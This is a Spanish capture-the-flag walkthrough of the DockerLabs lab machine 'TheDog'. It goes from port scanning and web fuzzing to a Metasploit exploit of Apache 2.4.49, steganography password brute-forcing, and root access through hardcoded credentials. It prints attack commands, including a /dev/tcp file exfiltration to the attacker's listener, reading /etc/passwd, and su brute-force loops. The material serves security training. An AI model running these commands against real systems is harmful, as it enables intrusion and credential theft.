# TheDog

TheDog es una máquina de dificultad media de la plataforma DockerLabs. En este walkthrough recorremos toda la cadena de compromiso: desde la enumeración inicial del servicio web, pasando por la explotación de una vulnerabilidad conocida en Apache, hasta la escalada de privilegios apoyándonos en esteganografía y credenciales embebidas en un binario.

El objetivo no es solo conseguir root, sino entender por qué cada fallo nos permite avanzar: por qué el servidor web es el punto de entrada, qué nos aporta cada pista, y cómo encadenamos un acceso limitado hasta el control total de la máquina.

---

## Despliegue de la máquina

Como siempre, levantamos la máquina con el script de despliegue de DockerLabs:

```bash
sudo bash auto_deploy.sh thedog.tar
```

![](<imagenes/Pasted image 20260730183318.png>)

Con la máquina en marcha y su IP asignada (172.17.0.2), empezamos el reconocimiento.

---

## Enumeración inicial

Lanzamos un escaneo completo de puertos con nmap para identificar qué servicios expone la máquina:

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![](<imagenes/Pasted image 20260730183451.png>)

El escaneo nos confirma que el puerto 80 está abierto. Al ser el único punto de entrada visible, el vector de ataque pasa por el servicio web.

---

## Identificación de la aplicación web

Abrimos el navegador y accedemos a la página para ver qué se está sirviendo:

![](<imagenes/Pasted image 20260730183628.png>)

Revisamos el código fuente por si hubiera información útil que no se muestra en pantalla, y encontramos la siguiente línea:

```html
<div data-note="Hay pistas en un html , fuzzing de ficheros"></div>
```

![](<imagenes/Pasted image 20260730184544.png>)

La propia página nos deja una pista: hay que hacer fuzzing de ficheros para descubrir rutas ocultas.

---

## Fuzzing de rutas

Siguiendo la pista, hacemos fuzzing de las rutas de la web con dirb y el diccionario común:

```bash
dirb http://172.17.0.2 /usr/share/wordlists/dirb/common.txt
```

![](<imagenes/Pasted image 20260730190036.png>)

---

## Identificación de versión y búsqueda de vulnerabilidad

Con la información recopilada, nos fijamos en la versión de Apache para comprobar si es vulnerable. Abrimos Metasploit y buscamos módulos para esa versión concreta:

```bash
search apache 2.4.49
```

![](<imagenes/Pasted image 20260730191751.png>)

Vemos que hay varios módulos disponibles. Apache 2.4.49 arrastra una vulnerabilidad conocida, así que probamos con el primero de la lista.

---

## Explotación – Apache 2.4.49

Seleccionamos el módulo y lo configuramos con los parámetros de la máquina objetivo y de nuestra máquina atacante:

![](<imagenes/Pasted image 20260730192251.png>)

```
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
set SSL false
set RPORT 80
run
```

![](<imagenes/Pasted image 20260730192639.png>)

La explotación nos devuelve una sesión de Meterpreter. Comprobamos el id y vemos que somos www-data, el usuario con el que corre el servidor web:

![](<imagenes/Pasted image 20260730192756.png>)

Abrimos una shell y la estabilizamos:

```bash
/bin/bash -i
```

![](<imagenes/Pasted image 20260730192929.png>)

---

## Escalada de privilegios – Enumeración como www-data

Ya dentro, empezamos a enumerar qué puede tocar www-data. Buscamos ficheros que pertenezcan a su grupo:

```bash
find / -group www-data 2>/dev/null | grep -v /proc/
```

![](<imagenes/Pasted image 20260730194030.png>)

Encontramos varios archivos. Empezamos por el `.stego`:

![](<imagenes/Pasted image 20260730194217.png>)

Este archivo nos indica que hay un fichero que esconde una contraseña. Revisamos el directorio completo a ver qué más hay:

![](<imagenes/Pasted image 20260730194323.png>)

Vemos un `.txt`, así que vamos a abrirlo.

---

## Exfiltración del fichero

Para trabajar cómodamente con el fichero, lo traemos a nuestra máquina. En nuestro terminal levantamos un listener con netcat que guarda lo que reciba:

```bash
nc -lvnp 9000 > miletra.txt
```

Y desde la shell de la máquina víctima enviamos el archivo por el socket:

```bash
cat /usr/include/musica/miletra.txt > /dev/tcp/172.17.0.1/9000
```

![](<imagenes/Pasted image 20260730194625.png>)

![](<imagenes/Pasted image 20260730194655.png>)

Ya tenemos el fichero en nuestra máquina.

---

## Fuerza bruta del stego

Como nos adelantaba la pista anterior, usamos snow (stegsnow) para extraer el contenido oculto. El problema es que no conocemos la contraseña que protege el stego, así que la sacamos por fuerza bruta con un pequeño script sobre rockyou:

```bash
nano brute-snow.sh
```

```bash
#!/bin/bash
for pass in $(cat /usr/share/wordlists/rockyou.txt); do
  output=$(stegsnow -C -p "$pass" miletra.txt 2>/dev/null)
  if [[ $output == "password:"* ]]; then
    echo "¡Contraseña del stego encontrada!: $pass"
    echo "Contenido oculto: $output"
    break
  fi
done
```

![](<imagenes/Pasted image 20260730194959.png>)

Lo ejecutamos:

![](<imagenes/Pasted image 20260730195031.png>)

`superman` era la contraseña que protegía el fichero stego, y nos ha sacado el contenido oculto: `password:secret`.

---

## Movimiento lateral – usuario punky

Con una credencial en la mano, miramos qué usuarios pueden iniciar sesión en el sistema para saber contra quién probarla:

```bash
cat /etc/passwd | grep -v nologin
```

![](<imagenes/Pasted image 20260730195600.png>)

Aparece otro usuario, punky. Probamos la contraseña recuperada (`secret`) con ese usuario:

![](<imagenes/Pasted image 20260730195715.png>)

Funciona: ya somos punky.

---

## Escalada de privilegios – binario task_manager

Como punky, revisamos los binarios del sistema a ver si hay algo aprovechable:

![](<imagenes/Pasted image 20260730195955.png>)

Nos llama la atención uno: `task_manager`. Miramos su ayuda para entender qué hace:

```bash
/usr/local/bin/task_manager -h
```

![](<imagenes/Pasted image 20260730200247.png>)

Con la ayuda a la vista, probamos si es vulnerable a inyección de comandos:

![](<imagenes/Pasted image 20260730200557.png>)

La inyección funciona, pero no nos da privilegios de root.

---

## Extracción de credenciales hardcodeadas

Como por esa vía no conseguimos root, cambiamos de enfoque y extraemos las cadenas del binario con `strings`, por si hubiera contraseñas embebidas:

![](<imagenes/Pasted image 20260730200828.png>)

Dentro salen varias contraseñas, así que las metemos en un archivo:

```bash
cat > /tmp/passwords.txt << 'EOF'
password
123456
qwerty
admin
guest
root
user
hannah
default
1234
0000
1111
9876
asdfgh
zxcvbn
qwertz
aaaaaa
bbbbbb
111111
EOF
```

`su` no acepta la contraseña por tubería de forma directa porque necesita una TTY, así que montamos un pequeño bucle que prueba cada candidata contra `su root` y comprueba si obtiene uid=0:

```bash
while read pass; do echo "$pass" | timeout 2 su root -c 'id' 2>/dev/null | grep -q "uid=0" && echo "[+] PASSWORD ROOT: $pass" && break; done < /tmp/passwords.txt
```

![](<imagenes/Pasted image 20260730201132.png>)

El bucle nos devuelve la contraseña de root.

---

## Acceso como root

Solo queda usar la contraseña para autenticarnos como root:

![](<imagenes/Pasted image 20260730201224.png>)

Con esto la máquina queda comprometida por completo.

---

## Conclusión

TheDog encadena varios conceptos hasta el compromiso total: la entrada llega por una vulnerabilidad conocida en Apache 2.4.49 que nos da una shell como www-data; a partir de ahí, la esteganografía nos entrega la credencial del usuario punky; y la escalada final combina el análisis de un binario personalizado con la extracción de credenciales hardcodeadas para llegar a root.

El ejercicio refuerza la importancia de no quedarse en el primer acceso: cada usuario y cada fichero pueden esconder el siguiente eslabón, y a veces el camino a root no está en el vector más obvio (la inyección del binario), sino en lo que ese binario revela por dentro (`strings`).

⚠️ Realizado con fines educativos y en un entorno controlado.
